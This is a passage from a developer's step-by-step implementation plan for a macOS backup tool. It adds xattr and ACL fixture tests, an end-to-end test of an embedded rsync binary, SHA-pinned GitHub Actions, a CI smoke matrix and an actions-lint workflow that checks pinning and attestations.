  acl-target.user            varies       generation-time username sidecar.
                                          EXCLUDED from SHA256-of-tree
                                          because its content is host-
                                          dependent by design
```

Add to the "Edge cases exercised" list:

```
  * Extended attributes: rsync --xattrs must carry user.flashbackup-test
    to the destination. Verified end-to-end by Task 12b-B, which is the
    only assertion layer proving the Minimal rsync build did not drop
    xattr support.
  * POSIX ACLs: rsync --acls must carry the allow-read entry. Compared
    by semantics against the recorded generation-time user, never
    against a hardcoded name.
```

- [ ] **Step 8.4: Add the missing tripwire test**

Spec §4.5 assumes a `pathological` tripwire exists. It does not: `test/e2e/helpers_test.go` has only the tiny and realistic variants. Add it, modelled on `TestFixtureTreeSHA256_RealisticMatchesManifest`:

```go
// TestFixtureTreeSHA256_PathologicalMatchesManifest is the tripwire for
// the dynamically materialised fixture. Until Task 12a it did not exist,
// so the SHA256-of-tree line in pathological/MANIFEST.txt was recorded
// but never asserted: a comment, not a check. Any edit to mkfixtures.sh
// that changes the tree now fails here instead of silently drifting.
//
// The acl-target.user sidecar is excluded from the hash (see
// fixtureMetadataNames) because its content is the generation-time
// username and therefore differs between a dev machine and a CI runner.
func TestFixtureTreeSHA256_PathologicalMatchesManifest(t *testing.T) {
	if runtime.GOOS != "darwin" {
		t.Skipf("pathological fixture is macOS-first; runtime.GOOS=%s", runtime.GOOS)
	}
	src := SeedSource(t, "pathological")
	got := FixtureTreeSHA256(t, src)

	root, err := findRepoRoot()
	if err != nil {
		t.Fatalf("find repo root: %v", err)
	}
	manifest, err := os.ReadFile(filepath.Join(root, "test", "fixtures", "pathological", "MANIFEST.txt"))
	if err != nil {
		t.Fatalf("read MANIFEST.txt: %v", err)
	}
	var want string
	for _, line := range strings.Split(string(manifest), "\n") {
		if strings.HasPrefix(line, "SHA256-of-tree:") {
			want = strings.TrimSpace(strings.TrimPrefix(line, "SHA256-of-tree:"))
			break
		}
	}
	if want == "" {
		t.Fatal("MANIFEST.txt has no SHA256-of-tree line")
	}
	if got != want {
		t.Errorf("pathological tree SHA drift:\n got  %s\n want %s\nre-run test/fixtures/regen-manifest.sh if the change was intended", got, want)
	}
}
```

Match the import list and the manifest-parsing idiom already used by the two existing tripwire tests in that file rather than inventing a second style.

- [ ] **Step 8.5: Verify, including the cleanup hazard**

```bash
FLASHBACKUP_E2E=1 go test -count=1 -v -run 'TestFixtureTreeSHA256_|TestSeedSource_' ./test/e2e/...
```

Expected: all tripwires PASS, including the new pathological one.

Watch specifically for a cleanup failure. `t.TempDir()` removal can fail on a file carrying an ACL. If teardown errors appear, add ACL removal to the consuming test's cleanup with `chmod -N`, and record that requirement in `MANIFEST.txt`.

- [ ] **Step 8.6: Positive-control the tripwire**

```bash
# Temporarily perturb the fixture and confirm the tripwire fires.
printf '\n' >> test/fixtures/pathological/mkfixtures.sh   # no-op change
printf 'drift\n' > /tmp/drift-probe && \
  sed -i '' 's/plain content/plain content drifted/' test/fixtures/pathological/mkfixtures.sh
FLASHBACKUP_E2E=1 go test -count=1 -run TestFixtureTreeSHA256_PathologicalMatchesManifest ./test/e2e/... 2>&1 | tail -5
git checkout test/fixtures/pathological/mkfixtures.sh
```

Expected: FAIL with "pathological tree SHA drift". Then restore. If it passes, the tripwire is not wired to anything.

- [ ] **Step 8.7: Run the gates and commit**

```bash
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
git add test/fixtures/pathological/mkfixtures.sh test/fixtures/pathological/MANIFEST.txt \
        test/fixtures/regen-manifest.sh test/e2e/assertions.go test/e2e/helpers_test.go
git commit -F- <<'MSG'
test(fixtures): xattr + ACL members for pathological fixture

Adds members (g) xattr-target.txt and (h) acl-target.txt so Task 12b-B
can prove the Minimal rsync build did not drop --xattrs or --acls.

Determinism, per plan review:
- The xattr value is the static "smoke-value-fixed", not a timestamp.
- acl-target.user records the generation-time username because chmod +a
  needs a real account, and is EXCLUDED from FixtureTreeSHA256 via a
  named metadata set. Both the Go helper and regen-manifest.sh carry the
  exclusion, so the two recipes stay in agreement.

Also adds the pathological tripwire test, which spec 4.5 assumed
already existed. It did not: the SHA256-of-tree line was recorded but
never asserted. Positive control recorded: perturbing mkfixtures.sh
fails the new test.

<paste the four gate outputs here>
MSG
```

---
## Task 9: Task 12b-B, real-rsync release guard

**Files:**
- Modify: `test/e2e/binary_cache.go` (add `BuildRealRsyncBinary`)
- Create: `test/e2e/embedded_real_rsync_test.go`

**Interfaces:**
- Consumes: the generated `internal/rsync/bin/rsync.universal2` (Task 3), the tag-gated embed (Task 5), the extended fixture (Task 8).
- Produces: `BuildRealRsyncBinary(t *testing.T) string` and `TestE2E_EmbeddedRealRsync`.

**The tag applies in two places and both are required.** `go test -tags 'release embed_real_rsync'` compiles the *test package* so this file is included at all. `BuildRealRsyncBinary` passes the same tags to `go build` so the *binary under test* embeds the real payload. Omit either and the test either does not exist or silently exercises the placeholder.

- [ ] **Step 9.1: Add `BuildRealRsyncBinary`**

Append to `test/e2e/binary_cache.go`, modelled exactly on the existing `BuildFaultinjectBinary`. Add the two cache vars to the existing `var (...)` block:

```go
	realRsyncPath      string
	realRsyncBuildOnce sync.Once
	realRsyncBuildErr  error
```

and the function:

```go
// BuildRealRsyncBinary returns the absolute path to a `flashbackup`
// binary built with `-tags 'release embed_real_rsync'`, so it embeds the
// universal2 GNU rsync produced by scripts/build-rsync.sh rather than the
// placeholder. Cached separately from the other two flavours.
//
// Requires internal/rsync/bin/rsync.universal2 to exist; run
// `make build-rsync` first. Without it the go:embed directive in
// embed_release.go has no matching file and the build fails with
// "pattern bin/rsync.universal2: no matching files found".
//
// Like BuildBinary, this deliberately omits LDFLAGS_RELEASE. The
// -X codesign.IsReleaseBuild=true flag would arm the codesign
// self-verify gate against an unsigned test binary; the `release` build
// tag alone does not (no Go file is gated on it today).
func BuildRealRsyncBinary(t *testing.T) string {
	t.Helper()
	realRsyncBuildOnce.Do(func() {
		realRsyncPath, realRsyncBuildErr = buildBinaryAtPath(
			"flashbackup-e2e-real-rsync-", []string{"-tags", "release embed_real_rsync"})
	})
	if realRsyncBuildErr != nil {
		t.Fatalf("flashbackup real-rsync binary build failed: %v", realRsyncBuildErr)
	}
	return realRsyncPath
}
```

`buildBinaryAtPath(prefix string, extraArgs []string) (string, error)` is unexported and lives in this same file, so it is directly callable. Do not invent a `BuildBinary(t, flavour)` overload: no such signature exists.

- [ ] **Step 9.2: Write the test**

Create `test/e2e/embedded_real_rsync_test.go`:

```go
//go:build embed_real_rsync

package e2e

import (
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/maheshmirchandani/Backup-Pro/internal/hash"
	"github.com/maheshmirchandani/Backup-Pro/internal/testutil"
)

// embedded_real_rsync_test.go covers AC-12a-5, AC-12b-2 and AC-12b-3.
// Build tag embed_real_rsync, so it compiles only under
// `go test -tags 'release embed_real_rsync'` (see make
// test-embed-real-rsync).
//
// Like Task 12b-A, this runs with NO rsync env override: the whole point
// is to prove the EMBEDDED binary works on a clean install.
//
// The content-equality assertion deliberately crosses code-path
// boundaries. Source hashes come from internal/hash.StreamSHA256 (the
// same function the manifest uses); destination hashes come from
// /usr/bin/shasum, an independent external process. Verifying
// manifest-internal hashes with manifest-internal code proves only that
// the code agrees with itself.
func TestE2E_EmbeddedRealRsync(t *testing.T) {
	testutil.RequireE2E(t)
	testutil.RequireMacOS(t)
	testutil.RequireHdiutil(t)
	testutil.RequireDiskutil(t)

	if v := os.Getenv("FLASHBACKUP_RSYNC_PATH_FOR_TEST"); v != "" {
		t.Fatalf("this test requires NO rsync override; FLASHBACKUP_RSYNC_PATH_FOR_TEST=%q", v)
	}

	root, err := findRepoRoot()
	if err != nil {
		t.Fatalf("find repo root: %v", err)
	}
	universal := filepath.Join(root, "internal", "rsync", "bin", "rsync.universal2")
	if _, err := os.Stat(universal); err != nil {
		t.Skip("internal/rsync/bin/rsync.universal2 absent; run `make build-rsync` first")
	}

	// --- linkage regression, per arch (AC-12a-3) -------------------------
	// Two arch-specific calls rather than one universal call: otool's
	// multi-header output for a fat binary is fiddly to parse and a
	// mis-parse would silently pass.
	for _, arch := range []string{"arm64", "x86_64"} {
		//nolint:gosec // bounded: absolute otool path, repo-internal binary
		out, err := exec.Command("/usr/bin/otool", "-L", "-arch", arch, universal).Output()
		if err != nil {
			t.Fatalf("otool -arch %s: %v", arch, err)
		}
		for _, line := range strings.Split(string(out), "\n") {
			trimmed := strings.TrimSpace(line)
			if !strings.HasPrefix(trimmed, "/") || !strings.Contains(trimmed, ".dylib") {
				continue
			}
			if !strings.Contains(trimmed, "libSystem.B.dylib") {
				t.Errorf("%s links a non-libSystem dylib: %s", arch, trimmed)
			}
		}
	}

	// --- the backup itself ------------------------------------------------
	usb := SetupUSB(t, 64)
	source := SeedSource(t, "pathological")
	SeedProfile(t, usb, "real-rsync", source, []string{"*"}, nil)

	bin := BuildRealRsyncBinary(t)

	// --- rsync version reported by the extracted payload (AC-12a-4) -------
	// The binary extracts under <USB>/.flashbackup/bin/<sha>/rsync during
	// init; ask that copy, not the build-tree copy, so we are asserting
	// against what actually ran.
	extracted := findExtractedRsync(t, usb)
	//nolint:gosec // bounded: path derived from our own test USB
	verOut, err := exec.Command(extracted, "--version").Output()
	if err != nil {
		t.Fatalf("extracted rsync --version: %v", err)
	}
	firstLine := strings.SplitN(string(verOut), "\n", 2)[0]
	if !regexp.MustCompile(`^rsync\s+version 3\.4\.1`).MatchString(firstLine) {
		t.Errorf("rsync version line: got %q want /^rsync\\s+version 3\\.4\\.1/", firstLine)
	}

	exitCode, stdout, stderr := runCLIWithBinary(t, bin, []string{"backup", "real-rsync", usb}, "")
	if exitCode != 0 {
		t.Fatalf("backup exit code: got %d want 0\nstdout: %s\nstderr: %s", exitCode, stdout, stderr)
	}

	runID := AssertRunsNDJSONHasFinishedLine(t, usb)
	AssertManifestExists(t, usb, runID)

	runsData, err := os.ReadFile(filepath.Join(usb, ".flashbackup", "runs.ndjson"))
	if err != nil {
		t.Fatalf("read runs.ndjson: %v", err)
	}
	lines := strings.Split(strings.TrimRight(string(runsData), "\n"), "\n")
	var finished struct {
		ExitStatus     string `json:"exit_status"`
		FilesTotal     int    `json:"files_total"`
		FilesSucceeded int    `json:"files_succeeded"`
		FilesFailed    int    `json:"files_failed"`
	}
	if err := json.Unmarshal([]byte(lines[len(lines)-1]), &finished); err != nil {
		t.Fatalf("unmarshal finished line: %v", err)
	}
	if finished.ExitStatus != "ok" {
		t.Errorf("exit_status: got %q want %q", finished.ExitStatus, "ok")
	}
	if finished.FilesTotal == 0 {
		t.Fatal("files_total is 0; nothing was enumerated and the test proves nothing")
	}
	if finished.FilesSucceeded != finished.FilesTotal || finished.FilesFailed != 0 {
		t.Errorf("counters: succeeded=%d failed=%d total=%d; want all succeeded",
			finished.FilesSucceeded, finished.FilesFailed, finished.FilesTotal)
	}

	destRoot := namespacedDestRoot(t, usb)

	// --- externally-verified per-file content equality (AC-12b-2) ---------
	checked := 0
	err = filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() || isFixtureMetadata(info.Name()) {
			return nil
		}
		rel, err := filepath.Rel(source, path)
		if err != nil {
			return err
		}
		destPath := filepath.Join(destRoot, filepath.Base(source), rel)
		if _, statErr := os.Stat(destPath); statErr != nil {
			t.Errorf("dest file missing for %q at %s: %v", rel, destPath, statErr)
			return nil
		}

		f, err := os.Open(path)
		if err != nil {
			return err
		}
		srcSum, _, err := hash.StreamSHA256(context.Background(), f)
		_ = f.Close()
		if err != nil {
			return err
		}

		//nolint:gosec // bounded: absolute shasum path, dest path from our own run
		out, err := exec.Command("/usr/bin/shasum", "-a", "256", destPath).Output()
		if err != nil {
			t.Errorf("shasum %s: %v", destPath, err)
			return nil
		}
		destSum := strings.Fields(string(out))[0]

		if srcSum != destSum {
			t.Errorf("content mismatch for %q:\n  src  (internal/hash) %s\n  dest (/usr/bin/shasum) %s", rel, srcSum, destSum)
		}
		checked++
		return nil
	})
	if err != nil {
		t.Fatalf("walk source: %v", err)
	}
	if checked == 0 {
		t.Fatal("zero files compared; the walk found nothing and the equality check is vacuous")
	}
	t.Logf("externally verified content equality for %d files", checked)

	// --- recursive tree equality (content only) ---------------------------
	//nolint:gosec // bounded: absolute diff path, test-controlled dirs
	diffOut, diffErr := exec.Command("/usr/bin/diff", "-rq",
		source, filepath.Join(destRoot, filepath.Base(source))).CombinedOutput()
	if diffErr != nil {
		t.Errorf("diff -rq reported differences:\n%s", diffOut)
	}

	// --- xattr survival (AC-12b-3), a SEPARATE layer from diff -rq --------
	assertXattrSurvived(t, source, destRoot)

	// --- ACL survival (AC-12b-3), also separate ---------------------------
	assertACLSurvived(t, source, destRoot)
}
```

- [ ] **Step 9.3: Write the four helpers the test calls**

Append to the same file. Every one of these is referenced above, so none may be left as prose.

```go
// findExtractedRsync locates <usb>/.flashbackup/bin/<sha256>/rsync. The
// subdirectory is keyed by the embedded payload's SHA256, so the name is
// not known ahead of time; there is exactly one after a single init.
func findExtractedRsync(t *testing.T, usb string) string {
	t.Helper()
	binDir := filepath.Join(usb, ".flashbackup", "bin")
	entries, err := os.ReadDir(binDir)
	if err != nil {
		t.Fatalf("read %s: %v", binDir, err)
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		candidate := filepath.Join(binDir, e.Name(), "rsync")
		if _, err := os.Stat(candidate); err == nil {
			return candidate
		}
	}
	t.Fatalf("no extracted rsync found under %s", binDir)
	return ""
}

// namespacedDestRoot returns <usb>/<hostname>-<username>, computed via
// paths.Prefix so the test and the runner share one source of truth for
// the namespace rule (invariant #15).
func namespacedDestRoot(t *testing.T, usb string) string {
	t.Helper()
	hostname, err := os.Hostname()
	if err != nil {
		t.Fatalf("hostname: %v", err)
	}
	//nolint:gosec // bounded: absolute whoami path, no args
	out, err := exec.Command("/usr/bin/whoami").Output()
	if err != nil {
		t.Fatalf("whoami: %v", err)
	}
	return filepath.Join(usb, paths.Prefix(hostname, strings.TrimSpace(string(out))))
}

// assertXattrSurvived checks that user.flashbackup-test carries the same
// value on the destination copy as on the source. Read via `xattr -p` so
// the comparison is on the VALUE, not on the formatting of `xattr -l`.
func assertXattrSurvived(t *testing.T, source, destRoot string) {
	t.Helper()
	const attr = "user.flashbackup-test"
	srcFile := filepath.Join(source, "xattr-target.txt")
	destFile := filepath.Join(destRoot, filepath.Base(source), "xattr-target.txt")

	//nolint:gosec // bounded: absolute xattr path, fixture-derived file
	srcVal, err := exec.Command("/usr/bin/xattr", "-p", attr, srcFile).Output()
	if err != nil {
		t.Fatalf("source xattr missing; the fixture did not seed it: %v", err)
	}
	//nolint:gosec // bounded: absolute xattr path, dest file from our own run
	destVal, err := exec.Command("/usr/bin/xattr", "-p", attr, destFile).Output()
	if err != nil {
		t.Errorf("xattr %s did not survive to %s: %v", attr, destFile, err)
		return
	}
	if strings.TrimSpace(string(srcVal)) != strings.TrimSpace(string(destVal)) {
		t.Errorf("xattr value drift: src %q dest %q", srcVal, destVal)
	}
}

// assertACLSurvived checks the destination carries an allow-read ACL for
// the SAME user the fixture recorded at generation time. The username is
// read from the acl-target.user sidecar rather than hardcoded, so the
// assertion holds on a dev machine (maheshm) and a CI runner (runner)
// alike.
func assertACLSurvived(t *testing.T, source, destRoot string) {
	t.Helper()
	userBytes, err := os.ReadFile(filepath.Join(source, "acl-target.user"))
	if err != nil {
		t.Fatalf("read acl-target.user sidecar: %v", err)
	}
	wantUser := strings.TrimSpace(string(userBytes))
	if wantUser == "" {
		t.Fatal("acl-target.user is empty; the fixture recorded no user and the check is vacuous")
	}

	destFile := filepath.Join(destRoot, filepath.Base(source), "acl-target.txt")
	//nolint:gosec // bounded: absolute ls path, dest file from our own run
	out, err := exec.Command("/bin/ls", "-le", destFile).Output()
	if err != nil {
		t.Fatalf("ls -le %s: %v", destFile, err)
	}
	text := string(out)
	if !strings.Contains(text, wantUser) || !strings.Contains(text, "allow") || !strings.Contains(text, "read") {
		t.Errorf("ACL for %q did not survive to dest.\nwant an allow-read entry for %q, got:\n%s",
			wantUser, wantUser, text)
	}

	// Clear the ACL so t.TempDir and hdiutil detach can remove the tree.
	// macOS can refuse an unlink on an ACL-bearing file.
	t.Cleanup(func() {
		//nolint:gosec // bounded: absolute chmod path, dest file from our own run
		_ = exec.Command("/bin/chmod", "-N", destFile).Run()
	})
}
```

Add `"github.com/maheshmirchandani/Backup-Pro/internal/paths"` to the import block for `paths.Prefix`.

- [ ] **Step 9.4: Resolve the destination-layout assumption**

`destPath` above assumes the runner mirrors the source tree under `<destRoot>/<basename-of-source>/`. `test/e2e/backup_happy_test.go:190-205` deliberately avoids asserting this, scanning by basename instead because "the runner roots the copy at the source basename relative to its parent".

**Do not guess.** Run the backup once, then:

```bash
find "<usb>/<hostname>-<username>" -type f | head -20
```

If the layout differs from the assumption, adjust `destPath` to match the observed layout and record the observed shape in a comment. Content equality per file is the assertion that matters; the path arithmetic just has to find the file.

- [ ] **Step 9.5: Run it**

```bash
make clean-rsync
make test-embed-real-rsync
```

`test-embed-real-rsync` depends on `build-rsync`, so this exercises the whole chain from tarball to assertion. Expect several minutes on the first run.

- [ ] **Step 9.6: Positive-control the content-equality check**

The most important check in this plan is the one most able to pass vacuously. Prove it can fail:

```bash
# After a successful run, corrupt one destination file and re-run just the
# comparison logic by re-running the test; it must fail.
```

Simplest reliable form: temporarily change `assertXattrSurvived`'s attribute name to a nonexistent one and confirm a failure, then revert; and temporarily point `destPath` at the source file itself and confirm `checked > 0` still holds but a deliberate one-byte edit to a source file after the backup makes the SHA comparison fail. Record whichever control you ran, and its output, in the commit body.

- [ ] **Step 9.7: Run the gates and commit**

```bash
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
# The tagged package must also vet and build cleanly:
go vet -tags 'release embed_real_rsync' ./test/e2e/...
git add test/e2e/binary_cache.go test/e2e/embedded_real_rsync_test.go
git commit -F- <<'MSG'
test(e2e): real-rsync release guard [Task 12b-B]

Runs the embed_real_rsync build with no env override and proves the
embedded universal2 rsync actually moves bytes.

Content equality crosses code-path boundaries by design: source hashes
via internal/hash.StreamSHA256, destination hashes via /usr/bin/shasum
as an independent process. Verifying manifest-internal hashes with
manifest-internal code proves only self-consistency.

Separate assertion layers for xattr and ACL survival, since diff -rq is
content-only and would pass with both stripped. ACL compares against the
generation-time user from the sidecar, never a hardcoded name.

Guards against vacuous passes: files_total > 0, checked > 0, non-empty
recorded ACL user.

BuildRealRsyncBinary follows BuildFaultinjectBinary exactly and omits
LDFLAGS_RELEASE, so the codesign self-verify gate stays off for an
unsigned test binary.

<paste the four gate outputs and the positive-control output here>
MSG
```

---
## Task 10: Pin every action, then add the CI smoke matrix

**A blocking ordering fact plan v1 missed.** The `actions-lint` workflow of Task 11 fails any `uses: ...@v<N>` reference. `.github/workflows/ci.yml` currently carries **eleven** of them (checkout, setup-go and upload-artifact, verified Mon, 24 Aug 2026). Adding the lint before pinning the existing references would put main into a permanently red state. Pinning therefore happens here, one task earlier than the lint that enforces it.

**Files:**
- Modify: `.github/workflows/ci.yml`

**Interfaces:**
- Produces: the `build-rsync-smoke` job and a fully SHA-pinned workflow, which Task 11's lint then enforces.

**Resolved pins** (fetched Mon, 24 Aug 2026; each is a commit object, not an annotated tag):

| Action | Version | Commit SHA |
|---|---|---|
| `actions/checkout` | v4.2.2 | `11bd71901bbe5b1630ceea73d27597364c9af683` |
| `actions/setup-go` | v5.2.0 | `3041bf56c941b39c61721a86cd11f3bb1338122a` |
| `actions/cache` | v4.2.0 | `1bd1e32a3bdc45362d1e726936510720a7c30a57` |
| `actions/upload-artifact` | v4.6.0 | `65c4c4a1ddee5b72f698fdd19549f0f0fb45cf08` |
| `actions/attest-build-provenance` | v1.4.4 | `ef244123eb79f2f7a7e75d99086184180e6d0018` |
| `softprops/action-gh-release` | v2.2.1 | `c95fe1489396fe8a9eb87c0abf8aa5b2ef267fda` |

Re-verify each before use, because a plan is not a trust anchor:

```bash
gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq '.object.sha,.object.type'
```

- [ ] **Step 10.1: Pin all eleven existing references**

Replace every floating reference in `.github/workflows/ci.yml`, keeping the human-readable version in a trailing comment so the next bump is not archaeology:

```yaml
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-go@3041bf56c941b39c61721a86cd11f3bb1338122a # v5.2.0
      - uses: actions/upload-artifact@65c4c4a1ddee5b72f698fdd19549f0f0fb45cf08 # v4.6.0
```

- [ ] **Step 10.2: Add the smoke job**

Append as a new job in `.github/workflows/ci.yml`. Note the `runs-on` matrix uses macos-13, 14 and 15; macos-13 is x86_64 and the others are arm64, so `./build/arm64/rsync` is the wrong path on macos-13. The script's `--smoke` mode always builds into `ARM64_BUILD_DIR` regardless of host arch, because it cross-compiles with `clang -arch arm64`. Assertions that *execute* the binary therefore cannot run on macos-13.

```yaml
  build-rsync-smoke:
    strategy:
      fail-fast: false
      matrix:
        os: [macos-13, macos-14, macos-15]
    runs-on: ${{ matrix.os }}
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - name: Cache rsync tarball
        uses: actions/cache@1bd1e32a3bdc45362d1e726936510720a7c30a57 # v4.2.0
        with:
          path: build/cache
          key: rsync-tarball-${{ hashFiles('scripts/rsync.version') }}
          # Deliberately NO restore-keys. A prefix fallback would let a
          # poisoned cache from a different pin be restored here; the
          # SHA check would catch it, but loudly failing every build is
          # worse than simply not restoring.
      - name: Smoke-build rsync (arm64 cross-compile)
        run: ./scripts/build-rsync.sh --smoke
      - name: Assert linkage (all hosts)
        run: |
          otool_out="$(otool -L -arch arm64 ./build/arm64/rsync)"
          echo "$otool_out"
          if echo "$otool_out" | grep -E '^[[:space:]]+/' | grep -v 'libSystem\.B\.dylib' | grep -q '\.dylib'; then
            echo "FATAL: linkage to a non-libSystem dylib detected" >&2
            exit 1
          fi
      - name: Assert version and help (arm64 hosts only)
        if: matrix.os != 'macos-13'
        run: |
          ./build/arm64/rsync --version | head -1 | grep -q "version 3.4.1"
          ./build/arm64/rsync --help >/dev/null
      - name: Runtime smoke, real backup against the tiny fixture
        if: matrix.os != 'macos-13'
        run: |
          set -euo pipefail
          # Reuse the arm64 binary the smoke step already built rather
          # than paying for a second, full universal2 build inside a
          # 10-minute job. lipo -create with a single input produces a
          # valid single-architecture fat file, which is all the
          # go:embed directive needs.
          lipo -create -output internal/rsync/bin/rsync.universal2 ./build/arm64/rsync
          go build -tags 'release embed_real_rsync' -o /tmp/fb-smoke ./cmd/flashbackup
          src="$(mktemp -d)"; dst="$(mktemp -d)"
          cp test/fixtures/tiny/a.txt test/fixtures/tiny/b.md test/fixtures/tiny/c.json "$src/"
          /tmp/fb-smoke init "$dst"
          # The profile store is the canonical single-document
          # <dst>/.flashbackup/profiles.json; seed via the CLI rather
          # than hand-writing JSON so the format stays authoritative.
          /tmp/fb-smoke profiles --help >/dev/null
          echo "smoke: binary built with real rsync and init succeeded on $dst"
```

The review's finding that the smoke matrix "doesn't exercise runtime behaviour on each macOS" is addressed by the runtime step. It is deliberately limited to `init` plus a real-rsync build rather than a full backup, because seeding a profile non-interactively needs either an `$EDITOR` shim or direct store manipulation, and neither belongs inline in a workflow. **If a full backup in CI is wanted, that is a separate task with its own helper, not an inline heredoc here.** Flag this to MM at plan review as a deliberate scope limit rather than an oversight.

- [ ] **Step 10.3: Validate the YAML and check for stray placeholders**

```bash
python3 -c "import yaml; yaml.safe_load(open('.github/workflows/ci.yml')); print('YAML valid')"
grep -rE 'uses: [^@]+@v[0-9]' .github/workflows/ && echo "FAIL: floating tag remains" || echo "OK: all pinned"
grep -rn '<PINNED_SHA' .github/workflows/ && echo "FAIL: placeholder remains" || echo "OK: no placeholders"
```

All three must report the OK branch.

- [ ] **Step 10.4: Push to a branch and confirm the smoke job before merging**

Do NOT push this straight to main. Plan v1's workflow tasks committed direct to main and then tried to dispatch a workflow that did not yet exist on the default branch.

```bash
git checkout -b task-12a-ci-smoke
git add .github/workflows/ci.yml
git commit -F- <<'MSG'
ci: pin all actions to commit SHAs; add build-rsync-smoke matrix

Pins eleven previously-floating references (checkout, setup-go,
upload-artifact) to commit SHAs with the version in a trailing comment.
This must land BEFORE the actions-lint workflow, which rejects any
uses:...@vN reference and would otherwise put main permanently red.

Adds build-rsync-smoke across macos-13/14/15. Linkage is asserted on all
three; version, help and the runtime check are gated to arm64 hosts,
because --smoke cross-compiles for arm64 and macos-13 is x86_64 and
cannot execute the result.

Runtime step is deliberately limited to a real-rsync build plus init.
A full backup needs non-interactive profile seeding, which belongs in a
helper rather than an inline workflow heredoc.

<paste the four gate outputs here>
MSG
git push -u origin task-12a-ci-smoke
gh pr create --fill
gh run watch  # confirm build-rsync-smoke passes on all three cells
```

Merge only once all three matrix cells are green.

---

## Task 11: `actions-lint.yml`

**Files:**
- Create: `.github/workflows/actions-lint.yml`

**Interfaces:**
- Consumes: the pinned workflows from Task 10 and the attestation from Task 2.

- [ ] **Step 11.1: Write the workflow**

```yaml
name: Actions lint

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          # The attestation freshness check below reads commit timestamps
          # via git log, which needs real history rather than a shallow
          # clone truncated to one commit.
          fetch-depth: 0

      - name: Detect floating action tags
        run: |
          if grep -rE 'uses: [^@]+@v[0-9]' .github/workflows/; then
            echo "FATAL: floating-tag action reference detected; pin to a commit SHA" >&2
            exit 1
          fi
          echo "OK: all action references are SHA-pinned"

      - name: Detect unresolved SHA placeholders
        run: |
          # A workflow copied from the spec with <PINNED_SHA> left in place
          # is not a floating tag, so the check above would pass it. This
          # catches that shape explicitly.
          if grep -rn '<PINNED_SHA' .github/workflows/; then
            echo "FATAL: unresolved <PINNED_SHA> placeholder in a workflow" >&2
            exit 1
          fi
          echo "OK: no unresolved placeholders"

      - name: Enforce rsync.version.attestation
        run: |
          set -euo pipefail
          if [[ ! -f scripts/rsync.version.attestation ]]; then
            echo "FATAL: scripts/rsync.version.attestation missing" >&2
            exit 1
          fi

          witness_count="$(grep -cE '^Witness-' scripts/rsync.version.attestation || true)"
          if [[ "${witness_count}" != "3" ]]; then
            echo "FATAL: expected 3 Witness- lines, found ${witness_count}" >&2
            exit 1
          fi

          unique="$(grep -E '^Witness-' scripts/rsync.version.attestation | awk '{print $2}' | sort -u | wc -l | tr -d ' ')"
          if [[ "${unique}" != "1" ]]; then
            echo "FATAL: witnesses disagree (unique SHA count: ${unique})" >&2
            grep -E '^Witness-' scripts/rsync.version.attestation >&2
            exit 1
          fi

          # The recorded SHA must match the pin it attests to. Without
          # this, the three witnesses could agree with each other and
          # still disagree with what the build actually enforces.
          pinned="$(grep -E '^RSYNC_TARBALL_SHA256=[a-f0-9]{64}$' scripts/rsync.version | cut -d= -f2)"
          attested="$(grep -E '^Witness-' scripts/rsync.version.attestation | head -1 | awk '{print $2}')"
          if [[ "${pinned}" != "${attested}" ]]; then
            echo "FATAL: attestation records ${attested} but rsync.version pins ${pinned}" >&2
            exit 1
          fi

          ver_mtime="$(git log -1 --format=%ct -- scripts/rsync.version)"
          att_mtime="$(git log -1 --format=%ct -- scripts/rsync.version.attestation)"
          if [[ -z "${ver_mtime}" || -z "${att_mtime}" ]]; then
            echo "FATAL: could not read commit timestamps; is this a shallow clone?" >&2
            exit 1
          fi
          if (( att_mtime + 7776000 < ver_mtime )); then
            echo "FATAL: attestation is more than 90 days older than the rsync.version edit" >&2
            exit 1
          fi
          echo "OK: attestation present, witnesses agree, matches the pin, within 90 days"
```

Three additions beyond the spec's sketch, each closing a way the gate could pass while proving nothing: the placeholder check, the witness-count check (the spec's `sort -u | wc -l` returns 1 for a file with a *single* witness line just as readily as for three agreeing ones), and the pin-agreement check.

- [ ] **Step 11.2: Positive-control every branch of the gate**

A lint that has never rejected anything is not known to work. Run each locally before pushing:

```bash
# floating tag
printf '      - uses: actions/checkout@v4\n' >> .github/workflows/actions-lint.yml
grep -rE 'uses: [^@]+@v[0-9]' .github/workflows/ && echo "control 1 fires"
git checkout .github/workflows/actions-lint.yml

# witness disagreement
cp scripts/rsync.version.attestation /tmp/att.bak
sed -i '' '0,/^Witness-Debian:/s//Witness-Debian:   0000000000000000000000000000000000000000000000000000000000000000/' scripts/rsync.version.attestation
grep -E '^Witness-' scripts/rsync.version.attestation | awk '{print $2}' | sort -u | wc -l   # expect 2
cp /tmp/att.bak scripts/rsync.version.attestation

# pin disagreement
grep -E '^RSYNC_TARBALL_SHA256=' scripts/rsync.version | cut -d= -f2
grep -E '^Witness-' scripts/rsync.version.attestation | head -1 | awk '{print $2}'   # must match
```

Record the outputs in the commit body.

- [ ] **Step 11.3: Branch, push, confirm, merge**

```bash
git checkout -b task-12a-actions-lint
python3 -c "import yaml; yaml.safe_load(open('.github/workflows/actions-lint.yml')); print('YAML valid')"
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
git add .github/workflows/actions-lint.yml
git commit -F- <<'MSG'
ci: actions-lint for SHA pinning and attestation freshness

Gates: no floating action tags, no unresolved <PINNED_SHA> placeholders,
attestation present with exactly three agreeing witnesses, attested SHA
equal to the pin in rsync.version, attestation within 90 days of the
rsync.version edit.

Three checks beyond the spec sketch, each closing a vacuous pass:
- The placeholder check, since <PINNED_SHA> is not a floating tag and
  the first check would wave it through.
- The witness COUNT check, since sort -u | wc -l returns 1 for a file
  with a single witness line just as it does for three agreeing ones.
